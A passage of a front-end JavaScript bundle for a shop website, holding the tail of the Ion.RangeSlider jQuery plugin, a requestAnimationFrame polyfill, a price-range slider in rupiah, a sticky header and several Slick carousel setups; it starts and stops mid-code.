                    this.$cache.max[0].style.visibility = "visible";
                }

            } else {

                if (values_num) {

                    if (this.options.decorate_both) {
                        text_single = this.decorate(p_values[this.result.from]);
                        text_single += this.options.values_separator;
                        text_single += this.decorate(p_values[this.result.to]);
                    } else {
                        text_single = this.decorate(p_values[this.result.from] + this.options.values_separator + p_values[this.result.to]);
                    }
                    text_from = this.decorate(p_values[this.result.from]);
                    text_to = this.decorate(p_values[this.result.to]);

                    this.$cache.single.html(text_single);
                    this.$cache.from.html(text_from);
                    this.$cache.to.html(text_to);

                } else {

                    if (this.options.decorate_both) {
                        text_single = this.decorate(this._prettify(this.result.from), this.result.from);
                        text_single += this.options.values_separator;
                        text_single += this.decorate(this._prettify(this.result.to), this.result.to);
                    } else {
                        text_single = this.decorate(this._prettify(this.result.from) + this.options.values_separator + this._prettify(this.result.to), this.result.to);
                    }
                    text_from = this.decorate(this._prettify(this.result.from), this.result.from);
                    text_to = this.decorate(this._prettify(this.result.to), this.result.to);

                    this.$cache.single.html(text_single);
                    this.$cache.from.html(text_from);
                    this.$cache.to.html(text_to);

                }

                this.calcLabels();

                var min = Math.min(this.labels.p_single_left, this.labels.p_from_left),
                    single_left = this.labels.p_single_left + this.labels.p_single_fake,
                    to_left = this.labels.p_to_left + this.labels.p_to_fake,
                    max = Math.max(single_left, to_left);

                if (this.labels.p_from_left + this.labels.p_from_fake >= this.labels.p_to_left) {
                    this.$cache.from[0].style.visibility = "hidden";
                    this.$cache.to[0].style.visibility = "hidden";
                    this.$cache.single[0].style.visibility = "visible";

                    if (this.result.from === this.result.to) {
                        if (this.target === "from") {
                            this.$cache.from[0].style.visibility = "visible";
                        } else if (this.target === "to") {
                            this.$cache.to[0].style.visibility = "visible";
                        } else if (!this.target) {
                            this.$cache.from[0].style.visibility = "visible";
                        }
                        this.$cache.single[0].style.visibility = "hidden";
                        max = to_left;
                    } else {
                        this.$cache.from[0].style.visibility = "hidden";
                        this.$cache.to[0].style.visibility = "hidden";
                        this.$cache.single[0].style.visibility = "visible";
                        max = Math.max(single_left, to_left);
                    }
                } else {
                    this.$cache.from[0].style.visibility = "visible";
                    this.$cache.to[0].style.visibility = "visible";
                    this.$cache.single[0].style.visibility = "hidden";
                }

                if (min < this.labels.p_min + 1) {
                    this.$cache.min[0].style.visibility = "hidden";
                } else {
                    this.$cache.min[0].style.visibility = "visible";
                }

                if (max > 100 - this.labels.p_max - 1) {
                    this.$cache.max[0].style.visibility = "hidden";
                } else {
                    this.$cache.max[0].style.visibility = "visible";
                }

            }
        },

        /**
         * Draw shadow intervals
         */
        drawShadow: function () {
            var o = this.options,
                c = this.$cache,

                is_from_min = typeof o.from_min === "number" && !isNaN(o.from_min),
                is_from_max = typeof o.from_max === "number" && !isNaN(o.from_max),
                is_to_min = typeof o.to_min === "number" && !isNaN(o.to_min),
                is_to_max = typeof o.to_max === "number" && !isNaN(o.to_max),

                from_min,
                from_max,
                to_min,
                to_max;

            if (o.type === "single") {
                if (o.from_shadow && (is_from_min || is_from_max)) {
                    from_min = this.convertToPercent(is_from_min ? o.from_min : o.min);
                    from_max = this.convertToPercent(is_from_max ? o.from_max : o.max) - from_min;
                    from_min = this.toFixed(from_min - (this.coords.p_handle / 100 * from_min));
                    from_max = this.toFixed(from_max - (this.coords.p_handle / 100 * from_max));
                    from_min = from_min + (this.coords.p_handle / 2);

                    c.shad_single[0].style.display = "block";
                    c.shad_single[0].style.left = from_min + "%";
                    c.shad_single[0].style.width = from_max + "%";
                } else {
                    c.shad_single[0].style.display = "none";
                }
            } else {
                if (o.from_shadow && (is_from_min || is_from_max)) {
                    from_min = this.convertToPercent(is_from_min ? o.from_min : o.min);
                    from_max = this.convertToPercent(is_from_max ? o.from_max : o.max) - from_min;
                    from_min = this.toFixed(from_min - (this.coords.p_handle / 100 * from_min));
                    from_max = this.toFixed(from_max - (this.coords.p_handle / 100 * from_max));
                    from_min = from_min + (this.coords.p_handle / 2);

                    c.shad_from[0].style.display = "block";
                    c.shad_from[0].style.left = from_min + "%";
                    c.shad_from[0].style.width = from_max + "%";
                } else {
                    c.shad_from[0].style.display = "none";
                }

                if (o.to_shadow && (is_to_min || is_to_max)) {
                    to_min = this.convertToPercent(is_to_min ? o.to_min : o.min);
                    to_max = this.convertToPercent(is_to_max ? o.to_max : o.max) - to_min;
                    to_min = this.toFixed(to_min - (this.coords.p_handle / 100 * to_min));
                    to_max = this.toFixed(to_max - (this.coords.p_handle / 100 * to_max));
                    to_min = to_min + (this.coords.p_handle / 2);

                    c.shad_to[0].style.display = "block";
                    c.shad_to[0].style.left = to_min + "%";
                    c.shad_to[0].style.width = to_max + "%";
                } else {
                    c.shad_to[0].style.display = "none";
                }
            }
        },



        /**
         * Write values to input element
         */
        writeToInput: function () {
            if (this.options.type === "single") {
                if (this.options.values.length) {
                    this.$cache.input.prop("value", this.result.from_value);
                } else {
                    this.$cache.input.prop("value", this.result.from);
                }
                this.$cache.input.data("from", this.result.from);
            } else {
                if (this.options.values.length) {
                    this.$cache.input.prop("value", this.result.from_value + this.options.input_values_separator + this.result.to_value);
                } else {
                    this.$cache.input.prop("value", this.result.from + this.options.input_values_separator + this.result.to);
                }
                this.$cache.input.data("from", this.result.from);
                this.$cache.input.data("to", this.result.to);
            }
        },



        // =============================================================================================================
        // Callbacks

        callOnStart: function () {
            this.writeToInput();

            if (this.options.onStart && typeof this.options.onStart === "function") {
                this.options.onStart(this.result);
            }
        },
        callOnChange: function () {
            this.writeToInput();

            if (this.options.onChange && typeof this.options.onChange === "function") {
                this.options.onChange(this.result);
            }
        },
        callOnFinish: function () {
            this.writeToInput();

            if (this.options.onFinish && typeof this.options.onFinish === "function") {
                this.options.onFinish(this.result);
            }
        },
        callOnUpdate: function () {
            this.writeToInput();

            if (this.options.onUpdate && typeof this.options.onUpdate === "function") {
                this.options.onUpdate(this.result);
            }
        },




        // =============================================================================================================
        // Service methods

        toggleInput: function () {
            this.$cache.input.toggleClass("irs-hidden-input");
        },

        /**
         * Convert real value to percent
         *
         * @param value {Number} X in real
         * @param no_min {boolean=} don't use min value
         * @returns {Number} X in percent
         */
        convertToPercent: function (value, no_min) {
            var diapason = this.options.max - this.options.min,
                one_percent = diapason / 100,
                val, percent;

            if (!diapason) {
                this.no_diapason = true;
                return 0;
            }

            if (no_min) {
                val = value;
            } else {
                val = value - this.options.min;
            }

            percent = val / one_percent;

            return this.toFixed(percent);
        },

        /**
         * Convert percent to real values
         *
         * @param percent {Number} X in percent
         * @returns {Number} X in real
         */
        convertToValue: function (percent) {
            var min = this.options.min,
                max = this.options.max,
                min_decimals = min.toString().split(".")[1],
                max_decimals = max.toString().split(".")[1],
                min_length, max_length,
                avg_decimals = 0,
                abs = 0;

            if (percent === 0) {
                return this.options.min;
            }
            if (percent === 100) {
                return this.options.max;
            }


            if (min_decimals) {
                min_length = min_decimals.length;
                avg_decimals = min_length;
            }
            if (max_decimals) {
                max_length = max_decimals.length;
                avg_decimals = max_length;
            }
            if (min_length && max_length) {
                avg_decimals = (min_length >= max_length) ? min_length : max_length;
            }

            if (min < 0) {
                abs = Math.abs(min);
                min = +(min + abs).toFixed(avg_decimals);
                max = +(max + abs).toFixed(avg_decimals);
            }

            var number = ((max - min) / 100 * percent) + min,
                string = this.options.step.toString().split(".")[1],
                result;

            if (string) {
                number = +number.toFixed(string.length);
            } else {
                number = number / this.options.step;
                number = number * this.options.step;

                number = +number.toFixed(0);
            }

            if (abs) {
                number -= abs;
            }

            if (string) {
                result = +number.toFixed(string.length);
            } else {
                result = this.toFixed(number);
            }

            if (result < this.options.min) {
                result = this.options.min;
            } else if (result > this.options.max) {
                result = this.options.max;
            }

            return result;
        },

        /**
         * Round percent value with step
         *
         * @param percent {Number}
         * @returns percent {Number} rounded
         */
        calcWithStep: function (percent) {
            var rounded = Math.round(percent / this.coords.p_step) * this.coords.p_step;

            if (rounded > 100) {
                rounded = 100;
            }
            if (percent === 100) {
                rounded = 100;
            }

            return this.toFixed(rounded);
        },

        checkMinInterval: function (p_current, p_next, type) {
            var o = this.options,
                current,
                next;

            if (!o.min_interval) {
                return p_current;
            }

            current = this.convertToValue(p_current);
            next = this.convertToValue(p_next);

            if (type === "from") {

                if (next - current < o.min_interval) {
                    current = next - o.min_interval;
                }

            } else {

                if (current - next < o.min_interval) {
                    current = next + o.min_interval;
                }

            }

            return this.convertToPercent(current);
        },

        checkMaxInterval: function (p_current, p_next, type) {
            var o = this.options,
                current,
                next;

            if (!o.max_interval) {
                return p_current;
            }

            current = this.convertToValue(p_current);
            next = this.convertToValue(p_next);

            if (type === "from") {

                if (next - current > o.max_interval) {
                    current = next - o.max_interval;
                }

            } else {

                if (current - next > o.max_interval) {
                    current = next + o.max_interval;
                }

            }

            return this.convertToPercent(current);
        },

        checkDiapason: function (p_num, min, max) {
            var num = this.convertToValue(p_num),
                o = this.options;

            if (typeof min !== "number") {
                min = o.min;
            }

            if (typeof max !== "number") {
                max = o.max;
            }

            if (num < min) {
                num = min;
            }

            if (num > max) {
                num = max;
            }

            return this.convertToPercent(num);
        },

        toFixed: function (num) {
            num = num.toFixed(20);
            return +num;
        },

        _prettify: function (num) {
            if (!this.options.prettify_enabled) {
                return num;
            }

            if (this.options.prettify && typeof this.options.prettify === "function") {
                return this.options.prettify(num);
            } else {
                return this.prettify(num);
            }
        },

        prettify: function (num) {
            var n = num.toString();
            return n.replace(/(\d{1,3}(?=(?:\d\d\d)+(?!\d)))/g, "$1" + this.options.prettify_separator);
        },

        checkEdges: function (left, width) {
            if (!this.options.force_edges) {
                return this.toFixed(left);
            }

            if (left < 0) {
                left = 0;
            } else if (left > 100 - width) {
                left = 100 - width;
            }

            return this.toFixed(left);
        },

        validate: function () {
            var o = this.options,
                r = this.result,
                v = o.values,
                vl = v.length,
                value,
                i;

            if (typeof o.min === "string") o.min = +o.min;
            if (typeof o.max === "string") o.max = +o.max;
            if (typeof o.from === "string") o.from = +o.from;
            if (typeof o.to === "string") o.to = +o.to;
            if (typeof o.step === "string") o.step = +o.step;

            if (typeof o.from_min === "string") o.from_min = +o.from_min;
            if (typeof o.from_max === "string") o.from_max = +o.from_max;
            if (typeof o.to_min === "string") o.to_min = +o.to_min;
            if (typeof o.to_max === "string") o.to_max = +o.to_max;

            if (typeof o.keyboard_step === "string") o.keyboard_step = +o.keyboard_step;
            if (typeof o.grid_num === "string") o.grid_num = +o.grid_num;

            if (o.max < o.min) {
                o.max = o.min;
            }

            if (vl) {
                o.p_values = [];
                o.min = 0;
                o.max = vl - 1;
                o.step = 1;
                o.grid_num = o.max;
                o.grid_snap = true;

                for (i = 0; i < vl; i++) {
                    value = +v[i];

                    if (!isNaN(value)) {
                        v[i] = value;
                        value = this._prettify(value);
                    } else {
                        value = v[i];
                    }

                    o.p_values.push(value);
                }
            }

            if (typeof o.from !== "number" || isNaN(o.from)) {
                o.from = o.min;
            }

            if (typeof o.to !== "number" || isNaN(o.to)) {
                o.to = o.max;
            }

            if (o.type === "single") {

                if (o.from < o.min) o.from = o.min;
                if (o.from > o.max) o.from = o.max;

            } else {

                if (o.from < o.min) o.from = o.min;
                if (o.from > o.max) o.from = o.max;

                if (o.to < o.min) o.to = o.min;
                if (o.to > o.max) o.to = o.max;

                if (this.update_check.from) {

                    if (this.update_check.from !== o.from) {
                        if (o.from > o.to) o.from = o.to;
                    }
                    if (this.update_check.to !== o.to) {
                        if (o.to < o.from) o.to = o.from;
                    }

                }

                if (o.from > o.to) o.from = o.to;
                if (o.to < o.from) o.to = o.from;

            }

            if (typeof o.step !== "number" || isNaN(o.step) || !o.step || o.step < 0) {
                o.step = 1;
            }

            if (typeof o.keyboard_step !== "number" || isNaN(o.keyboard_step) || !o.keyboard_step || o.keyboard_step < 0) {
                o.keyboard_step = 5;
            }

            if (typeof o.from_min === "number" && o.from < o.from_min) {
                o.from = o.from_min;
            }

            if (typeof o.from_max === "number" && o.from > o.from_max) {
                o.from = o.from_max;
            }

            if (typeof o.to_min === "number" && o.to < o.to_min) {
                o.to = o.to_min;
            }

            if (typeof o.to_max === "number" && o.from > o.to_max) {
                o.to = o.to_max;
            }

            if (r) {
                if (r.min !== o.min) {
                    r.min = o.min;
                }

                if (r.max !== o.max) {
                    r.max = o.max;
                }

                if (r.from < r.min || r.from > r.max) {
                    r.from = o.from;
                }

                if (r.to < r.min || r.to > r.max) {
                    r.to = o.to;
                }
            }

            if (typeof o.min_interval !== "number" || isNaN(o.min_interval) || !o.min_interval || o.min_interval < 0) {
                o.min_interval = 0;
            }

            if (typeof o.max_interval !== "number" || isNaN(o.max_interval) || !o.max_interval || o.max_interval < 0) {
                o.max_interval = 0;
            }

            if (o.min_interval && o.min_interval > o.max - o.min) {
                o.min_interval = o.max - o.min;
            }

            if (o.max_interval && o.max_interval > o.max - o.min) {
                o.max_interval = o.max - o.min;
            }
        },

        decorate: function (num, original) {
            var decorated = "",
                o = this.options;

            if (o.prefix) {
                decorated += o.prefix;
            }

            decorated += num;

            if (o.max_postfix) {
                if (o.values.length && num === o.p_values[o.max]) {
                    decorated += o.max_postfix;
                    if (o.postfix) {
                        decorated += " ";
                    }
                } else if (original === o.max) {
                    decorated += o.max_postfix;
                    if (o.postfix) {
                        decorated += " ";
                    }
                }
            }

            if (o.postfix) {
                decorated += o.postfix;
            }

            return decorated;
        },

        updateFrom: function () {
            this.result.from = this.options.from;
            this.result.from_percent = this.convertToPercent(this.result.from);
            if (this.options.values) {
                this.result.from_value = this.options.values[this.result.from];
            }
        },

        updateTo: function () {
            this.result.to = this.options.to;
            this.result.to_percent = this.convertToPercent(this.result.to);
            if (this.options.values) {
                this.result.to_value = this.options.values[this.result.to];
            }
        },

        updateResult: function () {
            this.result.min = this.options.min;
            this.result.max = this.options.max;
            this.updateFrom();
            this.updateTo();
        },


        // =============================================================================================================
        // Grid

        appendGrid: function () {
            if (!this.options.grid) {
                return;
            }

            var o = this.options,
                i, z,

                total = o.max - o.min,
                big_num = o.grid_num,
                big_p = 0,
                big_w = 0,

                small_max = 4,
                local_small_max,
                small_p,
                small_w = 0,

                result,
                html = '';



            this.calcGridMargin();

            if (o.grid_snap) {

                if (total > 50) {
                    big_num = 50 / o.step;
                    big_p = this.toFixed(o.step / 0.5);
                } else {
                    big_num = total / o.step;
                    big_p = this.toFixed(o.step / (total / 100));
                }

            } else {
                big_p = this.toFixed(100 / big_num);
            }

            if (big_num > 4) {
                small_max = 3;
            }
            if (big_num > 7) {
                small_max = 2;
            }
            if (big_num > 14) {
                small_max = 1;
            }
            if (big_num > 28) {
                small_max = 0;
            }

            for (i = 0; i < big_num + 1; i++) {
                local_small_max = small_max;

                big_w = this.toFixed(big_p * i);

                if (big_w > 100) {
                    big_w = 100;

                    local_small_max -= 2;
                    if (local_small_max < 0) {
                        local_small_max = 0;
                    }
                }
                this.coords.big[i] = big_w;

                small_p = (big_w - (big_p * (i - 1))) / (local_small_max + 1);

                for (z = 1; z <= local_small_max; z++) {
                    if (big_w === 0) {
                        break;
                    }

                    small_w = this.toFixed(big_w - (small_p * z));

                    html += '<span class="irs-grid-pol small" style="left: ' + small_w + '%"></span>';
                }

                html += '<span class="irs-grid-pol" style="left: ' + big_w + '%"></span>';

                result = this.convertToValue(big_w);
                if (o.values.length) {
                    result = o.p_values[result];
                } else {
                    result = this._prettify(result);
                }

                html += '<span class="irs-grid-text js-grid-text-' + i + '" style="left: ' + big_w + '%">' + result + '</span>';
            }
            this.coords.big_num = Math.ceil(big_num + 1);



            this.$cache.cont.addClass("irs-with-grid");
            this.$cache.grid.html(html);
            this.cacheGridLabels();
        },

        cacheGridLabels: function () {
            var $label, i,
                num = this.coords.big_num;

            for (i = 0; i < num; i++) {
                $label = this.$cache.grid.find(".js-grid-text-" + i);
                this.$cache.grid_labels.push($label);
            }

            this.calcGridLabels();
        },

        calcGridLabels: function () {
            var i, label, start = [], finish = [],
                num = this.coords.big_num;

            for (i = 0; i < num; i++) {
                this.coords.big_w[i] = this.$cache.grid_labels[i].outerWidth(false);
                this.coords.big_p[i] = this.toFixed(this.coords.big_w[i] / this.coords.w_rs * 100);
                this.coords.big_x[i] = this.toFixed(this.coords.big_p[i] / 2);

                start[i] = this.toFixed(this.coords.big[i] - this.coords.big_x[i]);
                finish[i] = this.toFixed(start[i] + this.coords.big_p[i]);
            }

            if (this.options.force_edges) {
                if (start[0] < -this.coords.grid_gap) {
                    start[0] = -this.coords.grid_gap;
                    finish[0] = this.toFixed(start[0] + this.coords.big_p[0]);

                    this.coords.big_x[0] = this.coords.grid_gap;
                }

                if (finish[num - 1] > 100 + this.coords.grid_gap) {
                    finish[num - 1] = 100 + this.coords.grid_gap;
                    start[num - 1] = this.toFixed(finish[num - 1] - this.coords.big_p[num - 1]);

                    this.coords.big_x[num - 1] = this.toFixed(this.coords.big_p[num - 1] - this.coords.grid_gap);
                }
            }

            this.calcGridCollision(2, start, finish);
            this.calcGridCollision(4, start, finish);

            for (i = 0; i < num; i++) {
                label = this.$cache.grid_labels[i][0];

                if (this.coords.big_x[i] !== Number.POSITIVE_INFINITY) {
                    label.style.marginLeft = -this.coords.big_x[i] + "%";
                }
            }
        },

        // Collisions Calc Beta
        // TODO: Refactor then have plenty of time
        calcGridCollision: function (step, start, finish) {
            var i, next_i, label,
                num = this.coords.big_num;

            for (i = 0; i < num; i += step) {
                next_i = i + (step / 2);
                if (next_i >= num) {
                    break;
                }

                label = this.$cache.grid_labels[next_i][0];

                if (finish[i] <= start[next_i]) {
                    label.style.visibility = "visible";
                } else {
                    label.style.visibility = "hidden";
                }
            }
        },

        calcGridMargin: function () {
            if (!this.options.grid_margin) {
                return;
            }

            this.coords.w_rs = this.$cache.rs.outerWidth(false);
            if (!this.coords.w_rs) {
                return;
            }

            if (this.options.type === "single") {
                this.coords.w_handle = this.$cache.s_single.outerWidth(false);
            } else {
                this.coords.w_handle = this.$cache.s_from.outerWidth(false);
            }
            this.coords.p_handle = this.toFixed(this.coords.w_handle  / this.coords.w_rs * 100);
            this.coords.grid_gap = this.toFixed((this.coords.p_handle / 2) - 0.1);

            this.$cache.grid[0].style.width = this.toFixed(100 - this.coords.p_handle) + "%";
            this.$cache.grid[0].style.left = this.coords.grid_gap + "%";
        },



        // =============================================================================================================
        // Public methods

        update: function (options) {
            if (!this.input) {
                return;
            }

            this.is_update = true;

            this.options.from = this.result.from;
            this.options.to = this.result.to;
            this.update_check.from = this.result.from;
            this.update_check.to = this.result.to;

            this.options = $.extend(this.options, options);
            this.validate();
            this.updateResult(options);

            this.toggleInput();
            this.remove();
            this.init(true);
        },

        reset: function () {
            if (!this.input) {
                return;
            }

            this.updateResult();
            this.update();
        },

        destroy: function () {
            if (!this.input) {
                return;
            }

            this.toggleInput();
            this.$cache.input.prop("readonly", false);
            $.data(this.input, "ionRangeSlider", null);

            this.remove();
            this.input = null;
            this.options = null;
        }
    };

    $.fn.ionRangeSlider = function (options) {
        return this.each(function() {
            if (!$.data(this, "ionRangeSlider")) {
                $.data(this, "ionRangeSlider", new IonRangeSlider(this, options, plugin_count++));
            }
        });
    };



    // =================================================================================================================
    // http://paulirish.com/2011/requestanimationframe-for-smart-animating/
    // http://my.opera.com/emoller/blog/2011/12/20/requestanimationframe-for-smart-er-animating

    // requestAnimationFrame polyfill by Erik MÃ¶ller. fixes from Paul Irish and Tino Zijdel

    // MIT license

    (function() {
        var lastTime = 0;
        var vendors = ['ms', 'moz', 'webkit', 'o'];
        for(var x = 0; x < vendors.length && !window.requestAnimationFrame; ++x) {
            window.requestAnimationFrame = window[vendors[x]+'RequestAnimationFrame'];
            window.cancelAnimationFrame = window[vendors[x]+'CancelAnimationFrame']
                || window[vendors[x]+'CancelRequestAnimationFrame'];
        }

        if (!window.requestAnimationFrame)
            window.requestAnimationFrame = function(callback, element) {
                var currTime = new Date().getTime();
                var timeToCall = Math.max(0, 16 - (currTime - lastTime));
                var id = window.setTimeout(function() { callback(currTime + timeToCall); },
                    timeToCall);
                lastTime = currTime + timeToCall;
                return id;
            };

        if (!window.cancelAnimationFrame)
            window.cancelAnimationFrame = function(id) {
                clearTimeout(id);
            };
    }());

}));


// Trigger

jQuery(function () {
  
    var $range = jQuery(".js-range-slider"),
        $inputFrom = jQuery(".js-input-from"),
        $inputTo = jQuery(".js-input-to"),
        instance,
        min = 0,
        max = 1000000,
        from = 0,
        to = 0;
    
    $range.ionRangeSlider({
        type: "double",
        min: min,
        max: max,
        from: 0,
        to: 500000,
      prefix: 'Rp. ',
        onStart: updateInputs,
        onChange: updateInputs,
        step: 50000,
        prettify_enabled: true,
        prettify_separator: ".",
      values_separator: " - ",
      force_edges: true
      
    
    });
    
    instance = $range.data("ionRangeSlider");
    
    function updateInputs (data) {
        from = data.from;
        to = data.to;
        
        $inputFrom.prop("value", from);
        $inputTo.prop("value", to); 
    }
    
    $inputFrom.on("input", function () {
        var val = $(this).prop("value");
        
        // validate
        if (val < min) {
            val = min;
        } else if (val > to) {
            val = to;
        }
        
        instance.update({
            from: val
        });
    });
    
    $inputTo.on("input", function () {
        var val = $(this).prop("value");
        
        // validate
        if (val < from) {
            val = from;
        } else if (val > max) {
            val = max;
        }
        
        instance.update({
            to: val
        });
    });
    
        });











  //sticky header

  window.onscroll = function() {myFunction()};

  var header = document.getElementById("stickyHeader");
  
  function myFunction() {
    if (window.pageYOffset > 100) {
        
      header.classList.add("sticky-header");
    } else {
      header.classList.remove("sticky-header");
    }
  }
function notificationWishlist(){
    
    jQuery('#notificationWishlist').show();
    setTimeout(function(){
        jQuery('#notificationWishlist').hide('slow');
      }, 2000);
}
// Tooltip
jQuery(function () {
    jQuery('[data-toggle="tooltip"]').tooltip();
})

$.noConflict();

//jQuery('.datepicker').datepicker();






jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.tab-carousel-js');
            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                       
                          
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: true,
                        infinite: false,
                        // variableWidth: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 4,
                        slidesToScroll: item || 4,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 3,
                                    slidesToScroll: 3
                                }
                            },
                            {
                                breakpoint: 950,
                                settings: {
                                    slidesToShow: 2,
                                    slidesToScroll: 2
                                }
                            },
                        {
                            breakpoint: 576,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
          
        })(jQuery);
});



// popular section
    
jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.popular-carousel-js');
            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                        
                            
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: true,
                        infinite: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 2,
                        slidesToScroll: item || 2,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                            {
                                breakpoint: 791,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                        {
                            breakpoint: 650,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
            
        })(jQuery);
});
// blog section
jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.blog-carousel-js');
            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                        
                            
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: true,
                        infinite: true,
                        autoplay: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 3,
                        slidesToScroll: item || 3,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 2,
                                    slidesToScroll: 2
                                }
                            },
                            {
                                breakpoint: 791,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                        {
                            breakpoint: 650,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
            
        })(jQuery);
});

// aboutus section
jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.aboutus-carousel-js');
            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                        
                            
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: true,
                        infinite: true,
                        autoplay: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 4,
                        slidesToScroll: item || 1,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 2,
                                    slidesToScroll: 2
                                }
                            },
                            {
                                breakpoint: 791,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                        {
                            breakpoint: 650,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
            
        })(jQuery);
});

// aboutus section
jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.insta-js');
            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                        
                            
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: false,
                        infinite: true,
                        autoplay: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 4,
                        slidesToScroll: item || 1,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 2,
                                    slidesToScroll: 2
                                }
                            },
                            {
                                breakpoint: 791,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                        {
                            breakpoint: 650,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
            
        })(jQuery);
});

// modal section
jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.modal-carousel-js');
            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                        
                            
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: true,
                        infinite: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 1,
                        slidesToScroll: item || 1,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                            {
                                breakpoint: 791,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                        {
                            breakpoint: 650,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
            
        })(jQuery);
});

// product page section
jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.product-carousel-js');
            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                        
                            
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: true,
                        infinite: true,
                        autoplay: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 4,
                        slidesToScroll: item || 1,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 2,
                                    slidesToScroll: 2
                                }
                            },
                            {
                                breakpoint: 791,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                        {
                            breakpoint: 650,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
            
        })(jQuery);
});
// product page3 section
jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.product-carousel-js3');
            if (tabCarousel.length) {
                
                tabCarousel.each(function(){
                    var thisCarousel = jQuery(this),
                        item =  jQuery(this).data('item'),
                        itemmobile =  jQuery(this).data('itemmobile');
                        
                            
                    
                    thisCarousel.slick({
                        lazyLoad: 'progressive',
                        dots: false,
                        arrows: true,
                        infinite: true,
                        autoplay: true,
                        //rtl:true,
                        speed: 300,
                        slidesToShow: item || 2,
                        slidesToScroll: item || 2,
                        adaptiveHeight: true,
                            responsive: [{
                                breakpoint: 1025,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                            {
                                breakpoint: 791,
                                settings: {
                                    slidesToShow: 1,
                                    slidesToScroll: 1
                                }
                            },
                        {
                            breakpoint: 650,
                            settings: {
                                slidesToShow: itemmobile || 1,
                                slidesToScroll: itemmobile || 1
                            }
                        }]
                    });
                });
            };
            
        })(jQuery);
});
     // product page5 section   
jQuery( document ).ready(function() {
    (function(jQuery){
        var tabCarousel = jQuery('.product-carousel-js5');
